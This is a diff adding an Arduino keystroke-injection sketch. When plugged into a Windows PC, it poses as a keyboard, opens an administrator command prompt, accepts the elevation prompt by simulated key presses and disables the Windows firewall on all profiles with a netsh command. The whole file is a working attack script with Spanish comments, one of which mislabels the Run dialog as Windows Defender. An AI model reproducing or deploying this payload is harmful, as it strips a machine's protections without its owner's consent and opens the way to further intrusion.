@@ -1,0 +1,38 @@
+#include "HID-Project.h"
+void setup() {
+  // put your setup code here, to run once:
+Keyboard.begin();
+  delay(500);
+
+//abre Windows Defender 
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press(KEY_R);
+  Keyboard.releaseAll();
+  delay(500);
+
+//Abrir terminal con privilegios de Administrador
+  Keyboard.print("cmd");
+  delay(500);
+  Keyboard.press(KEY_LEFT_SHIFT);
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press(KEY_ENTER);
+  Keyboard.releaseAll();
+  delay(2000);
+
+  //Ejecutar el pop up
+  Keyboard.press(KEY_LEFT_ARROW);
+  Keyboard.releaseAll();
+  delay(500);
+  Keyboard.press(KEY_ENTER);
+  Keyboard.releaseAll();
+  delay(500);
+
+  //Deshabilitar el firewall de Windows
+  Keyboard.println("netsh advfirewall set allprofiles state off");
+  Keyboard.println("exit");
+}
+
+void loop() {
+  // put your main code here, to run repeatedly:
+
+}
